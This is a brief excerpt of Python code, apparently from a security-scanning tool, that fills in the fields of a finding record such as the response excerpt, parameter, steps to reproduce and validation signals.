            response_excerpt=response_excerpt_str,
            verification_stage=stage,
            parameter=param,
            steps_to_reproduce=steps,
            validation_steps=[f"Signal: {s}" for s in evidence_parts],
        )


